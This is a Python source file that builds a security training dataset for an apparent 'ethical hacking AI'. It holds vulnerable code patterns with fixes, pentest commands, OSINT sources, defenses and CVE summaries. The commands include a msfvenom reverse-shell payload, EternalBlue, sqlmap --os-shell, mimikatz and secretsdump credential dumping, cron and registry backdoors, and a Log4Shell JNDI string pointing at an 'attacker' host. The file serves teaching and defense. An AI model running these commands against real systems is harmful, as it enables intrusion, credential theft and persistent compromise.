"""
Th3 Thirty3 - Security Datasets
Training data for ethical hacking AI models
"""

import json
import os
from typing import List, Dict, Any

class SecurityDatasets:
    """Security-focused training datasets for ethical hacking AI."""
    
    def __init__(self, data_dir='/app/datasets'):
        self.data_dir = data_dir
        os.makedirs(data_dir, exist_ok=True)
    
    def get_vulnerability_patterns(self) -> List[Dict[str, Any]]:
        """Get vulnerability pattern training data."""
        return [
            # SQL Injection
            {
                'pattern': "SELECT * FROM users WHERE id = '{user_input}'",
                'label': 'sql_injection',
                'severity': 'critical',
                'description': 'Direct string concatenation in SQL query',
                'fix': 'Use parameterized queries or prepared statements'
            },
            {
                'pattern': "query = f\"SELECT * FROM {table} WHERE {column} = {value}\"",
                'label': 'sql_injection',
                'severity': 'critical',
                'description': 'F-string SQL query construction',
                'fix': 'Use SQLAlchemy ORM or parameterized queries'
            },
            
            # XSS
            {
                'pattern': "innerHTML = user_input",
                'label': 'xss',
                'severity': 'high',
                'description': 'Direct innerHTML assignment with user input',
                'fix': 'Use textContent or sanitize HTML'
            },
            {
                'pattern': "document.write(location.search)",
                'label': 'xss',
                'severity': 'high',
                'description': 'DOM-based XSS via URL parameters',
                'fix': 'Validate and encode URL parameters'
            },
            
            # Command Injection
            {
                'pattern': "os.system(f'ping {host}')",
                'label': 'command_injection',
                'severity': 'critical',
                'description': 'Shell command with user input',
                'fix': 'Use subprocess with list arguments, validate input'
            },
            {
                'pattern': "subprocess.call(cmd, shell=True)",
                'label': 'command_injection',
                'severity': 'high',
                'description': 'Shell execution enabled in subprocess',
                'fix': 'Use shell=False with argument list'
            },
            
            # Path Traversal
            {
                'pattern': "open(os.path.join(base_dir, user_path))",
                'label': 'path_traversal',
                'severity': 'high',
                'description': 'Potential path traversal via user input',
                'fix': 'Validate path is within base directory'
            },
            
            # Authentication Issues
            {
                'pattern': "if password == stored_password:",
                'label': 'weak_auth',
                'severity': 'critical',
                'description': 'Plain text password comparison',
                'fix': 'Use bcrypt or argon2 for password hashing'
            },
            
            # Insecure Deserialization
            {
                'pattern': "pickle.loads(user_data)",
                'label': 'insecure_deserialization',
                'severity': 'critical',
                'description': 'Pickle deserialization of untrusted data',
                'fix': 'Use JSON or validate pickle source'
            },
            
            # SSRF
            {
                'pattern': "requests.get(user_provided_url)",
                'label': 'ssrf',
                'severity': 'high',
                'description': 'Server-side request to user-provided URL',
                'fix': 'Whitelist allowed domains, block internal IPs'
            }
        ]
    
    def get_pentesting_techniques(self) -> List[Dict[str, Any]]:
        """Get pentesting technique training data."""
        return [
            # Reconnaissance
            {
                'category': 'reconnaissance',
                'technique': 'Port Scanning',
                'tools': ['nmap', 'masscan', 'rustscan'],
                'commands': [
                    'nmap -sS -sV -O -p- target',
                    'nmap --script vuln target',
                    'masscan -p1-65535 target --rate 1000'
                ],
                'defenses': ['Firewall rules', 'Port knocking', 'IDS/IPS']
            },
            {
                'category': 'reconnaissance',
                'technique': 'Service Enumeration',
                'tools': ['nmap', 'enum4linux', 'smbclient'],
                'commands': [
                    'nmap -sV --version-intensity 5 target',
                    'enum4linux -a target',
                    'smbclient -L //target'
                ],
                'defenses': ['Minimal service exposure', 'Version hiding']
            },
            
            # Exploitation
            {
                'category': 'exploitation',
                'technique': 'Metasploit Framework',
                'tools': ['msfconsole', 'msfvenom'],
                'commands': [
                    'use exploit/windows/smb/ms17_010_eternalblue',
                    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe',
                    'sessions -i 1'
                ],
                'defenses': ['Patching', 'EDR', 'Network segmentation']
            },
            {
                'category': 'exploitation',
                'technique': 'SQL Injection',
                'tools': ['sqlmap', 'burpsuite'],
                'commands': [
                    'sqlmap -u "http://target/page?id=1" --dbs',
                    'sqlmap --os-shell',
                    'sqlmap --tamper=space2comment'
                ],
                'defenses': ['Parameterized queries', 'WAF', 'Input validation']
            },
            
            # Post-Exploitation
            {
                'category': 'post_exploitation',
                'technique': 'Privilege Escalation Linux',
                'tools': ['linpeas', 'linux-exploit-suggester'],
                'commands': [
                    'sudo -l',
                    'find / -perm -4000 2>/dev/null',
                    './linpeas.sh'
                ],
                'defenses': ['Least privilege', 'Sudo restrictions', 'Audit logs']
            },
            {
                'category': 'post_exploitation',
                'technique': 'Credential Dumping',
                'tools': ['mimikatz', 'secretsdump'],
                'commands': [
                    'sekurlsa::logonpasswords',
                    'lsadump::dcsync /user:Administrator',
                    'secretsdump.py domain/user:pass@dc'
                ],
                'defenses': ['Credential Guard', 'LSA Protection', 'LAPS']
            },
            
            # Persistence
            {
                'category': 'persistence',
                'technique': 'Backdoor Installation',
                'tools': ['netcat', 'cron', 'systemd'],
                'commands': [
                    'echo "* * * * * /path/to/backdoor" | crontab -',
                    'systemctl enable malicious.service',
                    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor'
                ],
                'defenses': ['File integrity monitoring', 'Autoruns analysis', 'EDR']
            }
        ]
    
    def get_osint_techniques(self) -> List[Dict[str, Any]]:
        """Get OSINT technique training data."""
        return [
            {
                'category': 'passive_recon',
                'technique': 'WHOIS Analysis',
                'description': 'Domain registration information gathering',
                'data_points': ['Registrant', 'Created date', 'Name servers', 'Contact info']
            },
            {
                'category': 'passive_recon', 
                'technique': 'DNS Enumeration',
                'description': 'Discover subdomains and DNS records',
                'tools': ['subfinder', 'amass', 'dnsrecon']
            },
            {
                'category': 'social_engineering',
                'technique': 'Social Media OSINT',
                'description': 'Gather info from social platforms',
                'platforms': ['LinkedIn', 'Twitter', 'GitHub', 'Facebook']
            },
            {
                'category': 'technical_recon',
                'technique': 'Shodan Search',
                'description': 'Find exposed devices and services',
                'queries': ['port:22', 'org:company', 'product:apache']
            },
            {
                'category': 'breach_data',
                'technique': 'Credential Leaks',
                'description': 'Search for exposed credentials',
                'sources': ['HaveIBeenPwned', 'DeHashed', 'BreachDirectory']
            }
        ]
    
    def get_defense_strategies(self) -> List[Dict[str, Any]]:
        """Get defense strategy training data."""
        return [
            {
                'category': 'network_security',
                'strategy': 'Network Segmentation',
                'implementation': 'VLANs, firewalls, zero-trust',
                'prevents': ['Lateral movement', 'Blast radius']
            },
            {
                'category': 'access_control',
                'strategy': 'Multi-Factor Authentication',
                'implementation': 'TOTP, FIDO2, SMS (fallback)',
                'prevents': ['Credential theft', 'Phishing']
            },
            {
                'category': 'monitoring',
                'strategy': 'SIEM Implementation',
                'implementation': 'Log aggregation, correlation, alerting',
                'detects': ['Anomalies', 'Attack patterns', 'Policy violations']
            },
            {
                'category': 'endpoint',
                'strategy': 'EDR Deployment',
                'implementation': 'Real-time monitoring, threat hunting',
                'detects': ['Malware', 'Fileless attacks', 'Lateral movement']
            },
            {
                'category': 'application',
                'strategy': 'WAF Configuration',
                'implementation': 'Rule-based filtering, anomaly detection',
                'prevents': ['SQLi', 'XSS', 'CSRF', 'Rate limiting']
            }
        ]
    
    def get_cve_training_data(self) -> List[Dict[str, Any]]:
        """Get CVE-based training data."""
        return [
            {
                'cve': 'CVE-2021-44228',
                'name': 'Log4Shell',
                'severity': 10.0,
                'type': 'Remote Code Execution',
                'affected': 'Apache Log4j 2.x',
                'exploit': '${jndi:ldap://attacker/exploit}',
                'remediation': 'Update to Log4j 2.17.0+'
            },
            {
                'cve': 'CVE-2017-0144',
                'name': 'EternalBlue',
                'severity': 9.8,
                'type': 'Remote Code Execution',
                'affected': 'Windows SMBv1',
                'exploit': 'Metasploit ms17_010_eternalblue',
                'remediation': 'Install MS17-010 patch, disable SMBv1'
            },
            {
                'cve': 'CVE-2021-34527',
                'name': 'PrintNightmare',
                'severity': 8.8,
                'type': 'Remote Code Execution',
                'affected': 'Windows Print Spooler',
                'exploit': 'CVE-2021-34527.py',
                'remediation': 'Disable Print Spooler or patch'
            },
            {
                'cve': 'CVE-2023-44487',
                'name': 'HTTP/2 Rapid Reset',
                'severity': 7.5,
                'type': 'Denial of Service',
                'affected': 'HTTP/2 implementations',
                'exploit': 'Rapid stream reset',
                'remediation': 'Apply vendor patches, rate limiting'
            }
        ]
    
    def save_dataset(self, name: str, data: List[Dict]) -> str:
        """Save dataset to file."""
        filepath = os.path.join(self.data_dir, f'{name}.json')
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        return filepath
    
    def load_dataset(self, name: str) -> List[Dict]:
        """Load dataset from file."""
        filepath = os.path.join(self.data_dir, f'{name}.json')
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
        return []
    
    def get_all_training_data(self) -> Dict[str, List]:
        """Get all training data combined."""
        return {
            'vulnerabilities': self.get_vulnerability_patterns(),
            'pentesting': self.get_pentesting_techniques(),
            'osint': self.get_osint_techniques(),
            'defense': self.get_defense_strategies(),
            'cves': self.get_cve_training_data()
        }


if __name__ == '__main__':
    # Test datasets
    datasets = SecurityDatasets()
    all_data = datasets.get_all_training_data()
    
    print(f"Vulnerability patterns: {len(all_data['vulnerabilities'])}")
    print(f"Pentesting techniques: {len(all_data['pentesting'])}")
    print(f"OSINT techniques: {len(all_data['osint'])}")
    print(f"Defense strategies: {len(all_data['defense'])}")
    print(f"CVE data: {len(all_data['cves'])}")
